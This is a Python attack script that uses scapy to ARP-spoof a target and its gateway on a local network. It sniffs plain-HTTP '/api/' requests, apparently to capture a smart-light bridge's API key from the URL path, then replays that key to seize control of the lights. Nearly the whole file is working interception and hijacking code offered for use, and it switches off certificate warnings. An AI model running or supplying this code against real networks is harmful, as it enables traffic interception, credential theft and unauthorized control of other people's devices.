import urllib3
import light_control as lc
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import sniff, srp, sendp

target_ip = "192.168.1.5"
gateway_ip = "192.168.1.247"
interface = "Wi-Fi"
stop_sniffing = [False]

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def arp_spoof(target_ip, spoof_ip, interface='YOUR_INTERFACE'):
    target_mac = get_mac(target_ip)
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)


def get_mac(ip):
    response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    for _, packet in response:
        return packet[Ether].src


def sniff_packets(interface='Wi-Fi'):
    def process_packet(packet):
        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]
            if http_layer.fields['Method'] == b'GET' and http_layer.fields['Path'][:5] == b'/api/' and len(
                    http_layer.fields['Path']) > 5:
                if http_layer.fields['Path'][5:6] != b'/':
                    print(f"Detected a GET request to {http_layer.fields['Host'].decode()}{http_layer.fields['Path'].decode()}")
                    initiate_rainbow(f"https://{gateway_ip}{http_layer.fields['Path'].decode()}")

    print("Starting packet sniffing...")
    sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80",
          stop_filter=lambda x: stop_sniffing[0])


def initiate_rainbow(url):
    lights = lc.retrieve_lights(url)
    lc.process_lights(url, lights)


def main():
    sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
    sniffer_thread.start()
    try:
        while True:
            arp_spoof(target_ip, gateway_ip, interface)
            arp_spoof(gateway_ip, target_ip, interface)
            time.sleep(10)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")


if __name__ == "__main__":
    main()